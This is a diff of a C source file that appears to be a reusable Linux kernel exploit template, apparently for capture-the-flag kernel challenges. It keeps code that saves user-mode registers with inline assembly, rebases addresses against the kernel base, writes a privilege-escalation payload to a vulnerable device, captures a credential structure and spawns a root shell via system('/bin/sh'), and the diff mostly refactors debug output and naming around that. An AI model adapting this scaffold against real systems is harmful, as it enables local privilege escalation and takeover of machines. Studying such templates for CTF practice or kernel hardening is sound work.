@@ -2,22 +2,31 @@
 #include <stdarg.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
 
-#ifdef DEBUG
-#define debug(msg, ...) fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);
-#else
-#define debug(msg, ...)
-#endif /* ifdef DEBUG */
-
-#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
+#define debug(msg, ...)                                                        \
+    {                                                                          \
+        if (DEBUG_FLAG) {                                                      \
+            fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
+        }                                                                      \
+    }
+#define info_prefix "[*] "
+#define info(msg, ...) printf(info_prefix msg "\n", ##__VA_ARGS__);
 #define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
 #define fatal(msg, ...)                                                        \
     {                                                                          \
         printf("[!] " msg "\n", ##__VA_ARGS__);                                \
         exit(EXIT_FAILURE);                                                    \
     }
+#define pause()                                                                \
+    {                                                                          \
+        printf(info_prefix "Press ENTER to continue");                         \
+        getchar();                                                             \
+    }
+#define var(var) printf(info_prefix #var " = 0x%016llx\n", var);
+#define rebase(addr) (addr - RAW_KBASE + kbase)
 
 #define DEVICE_NAME "CHANGEME"
 #define RAW_KBASE 0xffffffff81000000
@@ -26,7 +35,8 @@ typedef unsigned long long u64;
 typedef unsigned int u32;
 typedef unsigned char u8;
 
-int global_fd;
+u8 DEBUG_FLAG = 0;
+int g_fd;
 
 u64 user_cs, user_rflags, user_sp, user_ss;
 u64 cookie, kbase, offset;
@@ -35,10 +45,10 @@ u64 tmp_buf, cred_struct;
 enum current_state {
     create_cred_struct_state,
     spawn_shell_state,
-} global_cstate;
+} global_cstate = create_cred_struct_state;
 
 void _write(void *buf, size_t sz) {
-    ssize_t nb = write(global_fd, buf, sz);
+    ssize_t nb = write(g_fd, buf, sz);
     if (nb < 0) {
         fatal("write failure");
     }
@@ -46,7 +56,7 @@ void _write(void *buf, size_t sz) {
 }
 
 void _read(void *buf, size_t sz) {
-    ssize_t nb = read(global_fd, buf, sz);
+    ssize_t nb = read(g_fd, buf, sz);
     if (nb < 0) {
         fatal("read failure");
     }
@@ -54,12 +64,12 @@ void _read(void *buf, size_t sz) {
 }
 
 void _ioctl(u32 cmd, u64 arg) {
-    ioctl(global_fd, cmd, arg);
+    ioctl(g_fd, cmd, arg);
 }
 
 void open_dev(void) {
-    global_fd = open(DEVICE_NAME, O_RDWR);
-    if (global_fd < 0) {
+    g_fd = open(DEVICE_NAME, O_RDWR);
+    if (g_fd < 0) {
         fatal("Failed to open device: %s", DEVICE_NAME);
     }
     debug("Device opened");
@@ -74,21 +84,7 @@ void spawn_shell(void) {
     system("/bin/sh");
 }
 
-void privesc(void);
-
-void safe_exit(void) {
-    __asm__(".intel_syntax noprefix;"
-            "mov tmp_buf, rax;"
-            ".att_syntax noprefix;");
-    if (global_cstate == create_cred_struct_state) {
-        cred_struct = tmp_buf;
-        info("cred_struct @ 0x%llx", cred_struct);
-        global_cstate = spawn_shell_state;
-        privesc();
-        return;
-    }
-    spawn_shell();
-}
+void safe_exit(void);
 
 void privesc(void) {
     size_t payload[0x200 / 8];
@@ -119,6 +115,20 @@ void privesc(void) {
     _write(payload, sizeof(payload));
 }
 
+void safe_exit(void) {
+    __asm__(".intel_syntax noprefix;"
+            "mov tmp_buf, rax;"
+            ".att_syntax noprefix;");
+    if (global_cstate == create_cred_struct_state) {
+        cred_struct = tmp_buf;
+        debug("cred_struct @ 0x%llx", cred_struct);
+        global_cstate = spawn_shell_state;
+        privesc();
+        return;
+    }
+    spawn_shell();
+}
+
 void save_user_state(void) {
     __asm__(".intel_syntax noprefix;"
             "mov user_cs, cs;"
@@ -130,12 +140,21 @@ void save_user_state(void) {
     debug("User state saved");
 }
 
-int main(void) {
+int main(int argc, char *argv[]) {
+    for (size_t i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "DEBUG") == 0) {
+            DEBUG_FLAG = 1;
+            break;
+        }
+    }
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
     save_user_state();
 
     open_dev();
     getchar();
 
-    close(global_fd);
+    close(g_fd);
     return 0;
 }
